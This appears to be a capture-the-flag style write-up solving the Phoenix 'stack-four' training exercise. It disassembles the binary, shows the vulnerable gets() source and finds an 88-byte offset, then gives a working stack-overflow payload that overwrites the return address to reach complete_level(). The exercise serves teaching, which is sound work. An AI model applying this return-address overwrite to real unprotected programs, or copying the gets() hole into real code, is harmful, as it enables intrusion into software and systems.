# PHOENIX - stack 4

Lets list the files using ```ls -la```,

```
user@phoenix-amd64:~$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Jun  6 05:25 .
drwxr-xr-x 3 root root 4096 Jan 13  2019 ..
-rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout
-rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc
-rw-r--r-- 1 user user  675 Jan 13  2019 .profile
-rwxr-xr-x 1 user user 6096 Jun  6 05:25 stack-four
```

Lets check the file type of the binary using ```file``` command,

```
user@phoenix-amd64:~$ file stack-four
stack-four: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

It is a ```not stripped``` binary

Now,lets try running it

```
user@phoenix-amd64:~$ ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
monish
and will be returning to 0x40068d
user@phoenix-amd64:~$ ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
and will be returning to 0x40068d
```

So there is something fishy with ```0x40068d```

Lets use debugger on this binary,

Viewing functions

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  printf@plt
0x0000000000400470  gets@plt
0x0000000000400480  puts@plt
0x0000000000400490  exit@plt
0x00000000004004a0  __libc_start_main@plt
0x00000000004004b0  _start
0x00000000004004c6  _start_c
0x00000000004004f0  deregister_tm_clones
0x0000000000400520  register_tm_clones
0x0000000000400560  __do_global_dtors_aux
0x00000000004005f0  frame_dummy
0x000000000040061d  complete_level
0x0000000000400635  start_level
0x000000000040066a  main
0x00000000004006a0  __do_global_ctors_aux
0x00000000004006e2  _fini
```

It has three distinguishable functions

```
0x000000000040061d  complete_level
0x0000000000400635  start_level
0x000000000040066a  main
```

Disassembling ```main()```,

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000040066a <+0>:	  push   rbp
   0x000000000040066b <+1>:	  mov    rbp,rsp
   0x000000000040066e <+4>:	  sub    rsp,0x10
   0x0000000000400672 <+8>:	  mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400675 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400679 <+15>:	mov    edi,0x400750
   0x000000000040067e <+20>:	call   0x400480 <puts@plt>
   0x0000000000400683 <+25>:	mov    eax,0x0
   0x0000000000400688 <+30>:	call   0x400635 <start_level>
   0x000000000040068d <+35>:	mov    eax,0x0
   0x0000000000400692 <+40>:	leave
   0x0000000000400693 <+41>:	ret
End of assembler dump.
```
```main()``` calls ```start_level()```


Disassembling ```start_level()```,

```
pwndbg> disassemble start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:	  push   rbp
   0x0000000000400636 <+1>:	  mov    rbp,rsp
   0x0000000000400639 <+4>:	  sub    rsp,0x50
   0x000000000040063d <+8>:	  lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:	mov    rdi,rax
   0x0000000000400644 <+15>:	call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:	mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:	mov    rsi,rax
   0x0000000000400658 <+35>:	mov    edi,0x400733
   0x000000000040065d <+40>:	mov    eax,0x0
   0x0000000000400662 <+45>:	call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:	nop
   0x0000000000400668 <+51>:	leave
   0x0000000000400669 <+52>:	ret
End of assembler dump.
```
```start_level()``` calls ```complete_level()```


Disassembling ```complete_level()```,

```
pwndbg> disassemble complete_level
Dump of assembler code for function complete_level:
   0x000000000040061d <+0>:	  push   rbp
   0x000000000040061e <+1>:	  mov    rbp,rsp
   0x0000000000400621 <+4>:	  mov    edi,0x4006f0
   0x0000000000400626 <+9>:	  call   0x400480 <puts@plt>
   0x000000000040062b <+14>:	mov    edi,0x0
   0x0000000000400630 <+19>:	call   0x400490 <exit@plt>
End of assembler dump.
```

Lets take a look at source code for proper understanding,

```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

The main part of this program is,

```
void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}
```

Here ```ret = __builtin_return_address(0);``` points the return address of the program when it is being executed in stack

And there is no link between ```start_level()``` and ```complete_level()```

The only way we can call ```complete_level()``` is to point its address into the ```ret```


In ```start_level()```,

```
   0x000000000040063d <+8>:	lea    rax,[rbp-0x50]
```
This is used to load the buffer space for ```buffer```

```
0x000000000040064d <+24>:	mov    QWORD PTR [rbp-0x8],rax
```
This is used to store the return address ```ret```

Checking the security mitigations of the binary,

```
ra@moni~/E/p/stack4> checksec  stack-four
[*] '/home/ra/ExpDevPractice/phoenix/stack4/stack-four'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
```

So we can overflow the binary as there are no security mitigations in it

We have to crash the binary by junk data in ```buffer``` and the address of ```complete_level()``` in ```ret```

Lets try crashing it

Creating a random patten for fuzzing,

```
ra@moni/o/m/e/f/t/exploit> ./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Passing this random pattern as input in binary would make it crash,

```
user@phoenix-amd64:~$ python -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A')" | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x3164413064413963
Segmentation fault
```

So we overwrote our ```ret``` return address as ```0x3164413064413963``` from ```0x40068d```

Lets try to find the offset of our return address ```ret```,

```
ra@moni/o/m/e/f/t/exploit> ./pattern_offset.rb -q 0x3164413064413963
[*] Exact match at offset 88
```

We came to know that after 88th offset from buffer we can enter into ```ret```

Lets exploit this binary now,

```
user@phoenix-amd64:~$ python -c "print('A'*88+'BBBB')" | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x42424242
Segmentation fault
```

```payload = junk(88bytes) + address of complete_level()```

Address of ```complete_level()``` = ```0x000000000040061d```

```
user@phoenix-amd64:~$ python -c "print('A'*88+'\x1d\x06\x40')" | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

Done! we have completed "stack-four"




